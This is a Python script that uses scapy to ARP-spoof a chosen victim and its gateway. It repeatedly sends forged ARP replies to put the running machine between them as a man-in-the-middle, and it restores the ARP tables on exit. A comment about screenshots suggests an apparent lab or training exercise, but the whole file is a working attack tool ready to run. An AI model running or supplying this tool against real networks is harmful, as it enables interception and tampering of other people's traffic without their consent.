#!/usr/bin/python3

import scapy.all as scapy
import time
import argparse
import sys
import os

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target', help='ARP spoof victim', required=True)
    parser.add_argument('-g', '--gateway', dest='gateway', help='Gateway IP', required=True)
    parser.add_argument('-f', dest='frequency',
                        help='Number of seconds to wait before retrying the spoof operation (default 2)',
                        required=False)
    options = parser.parse_args()
    return options

def check_root():
    if os.geteuid() != 0:
        print("[!] This script must be run as root (sudo).")
        sys.exit(1)

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = scapy.getmacbyip(destination_ip)
    source_mac = scapy.getmacbyip(source_ip)
    if destination_mac is None or source_mac is None:
        print("[!] Could not resolve MACs for restore; skipping restore packet.")
        return
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

def resolve_and_print(ip, name):
    mac = scapy.getmacbyip(ip)
    print(f"[i] {name} {ip} -> MAC {mac}")
    return mac

if __name__ == "__main__":
    check_root()
    args = get_args()
    target_ip = args.target
    gateway_ip = args.gateway

    # default frequency = 2 seconds if not provided
    if args.frequency:
        try:
            n = int(args.frequency)
            if n <= 0:
                n = 2
        except:
            n = 2
    else:
        n = 2

    # print resolved MACs (helpful for screenshots)
    target_mac = resolve_and_print(target_ip, "Victim")
    gateway_mac = resolve_and_print(gateway_ip, "Gateway")

    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            print("\r[*] Packets sent: " + str(sent_packets_count), end="")
            time.sleep(n)

    except KeyboardInterrupt:
        print("\nCtrl + C pressed. Exiting...")
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        print("[+] ARP spoof stopped")
